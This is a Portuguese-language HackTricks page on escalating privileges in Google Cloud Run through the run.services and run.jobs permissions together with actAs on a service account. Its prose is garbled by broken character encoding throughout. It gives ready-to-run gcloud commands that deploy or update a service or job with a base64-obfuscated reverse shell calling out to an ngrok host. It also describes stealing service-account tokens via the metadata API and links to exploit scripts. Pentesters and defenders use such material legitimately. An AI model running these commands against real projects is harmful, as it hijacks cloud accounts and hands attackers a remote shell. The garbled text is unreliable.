# GCP - Execu√ß√£o de Privil√©gios

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## run

### `run.services.create`, `iam.serviceAccounts.actAs`

Semelhante ao m√©todo _cloudfunctions.functions.create_, este m√©todo cria um **novo servi√ßo Cloud Run** que, quando invocado, **retorna o token de acesso da Conta de Servi√ßo** acessando a API de metadados do servidor em que est√° sendo executado. Um servi√ßo Cloud Run ser√° implantado e uma solicita√ß√£o pode ser realizada para ele para obter o token.

As seguintes **permiss√µes s√£o necess√°rias** para este m√©todo:

* _run.services.create_
* _iam.serviceaccounts.actAs_
* _run.services.setIamPolicy_ **OU** _run.routes.invoke_

![](https://rhinosecuritylabs.com/wp-content/uploads/2020/04/image8-1000x503.png)

Este m√©todo usa uma imagem Docker inclu√≠da que deve ser constru√≠da e hospedada para ser explorada corretamente. A imagem √© projetada para informar ao Cloud Run para responder com o token de acesso da Conta de Servi√ßo quando uma solicita√ß√£o HTTP √© feita.

O script de explora√ß√£o para este m√©todo pode ser encontrado [aqui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/run.services.create.py) e a imagem Docker pode ser encontrada [aqui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudRunDockerImage).

Por algum motivo, ao usar `gcloud run deploy` em vez de apenas criar o servi√ßo, **√© necess√°rio a permiss√£o de atualiza√ß√£o**. Verifique um [**exemplo aqui**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/o-run.services.create.sh).

### `run.services.update`, `iam.serviceAccounts.actAs`

Semelhante ao anterior, mas atualizando um servi√ßo

```bash
gcloud run deploy hacked \
--image=marketplace.gcr.io/google/ubuntu2004 \
--command=bash \
--args="-c,echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash" \
--service-account="<proj-num>-compute@developer.gserviceaccount.com" \
--region=us-central1 \
--allow-unauthenticated
```

### `run.services.setIamPolicy`

D√™ a si mesmo as permiss√µes anteriores.

### `run.jobs.create`, `run.jobs.run`, (`run.jobs.get`)

Inicie um trabalho com um shell reverso para roubar a conta de servi√ßo indicada no comando. Voc√™ pode encontrar uma [**explora√ß√£o aqui**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/m-run.jobs.create.sh).

### `run.jobs.update`, `run.jobs.run`, `iam.serviceaccounts.actAs`, (`run.jobs.get`)

Semelhante ao anterior, √© poss√≠vel **atualizar um trabalho e atualizar a SA**, o **comando** e **execut√°-lo**:

```bash
gcloud beta run jobs update hacked \
--image=marketplace.gcr.io/google/ubuntu2004 \
--command=bash \
--args="-c,echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash" \
--service-account=<proj-num>-compute@developer.gserviceaccount.com \
--region=us-central1 \
--project=security-devbox --execute-now
```

### `run.jobs.setIamPolicy`

D√™ a si mesmo as permiss√µes anteriores.

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>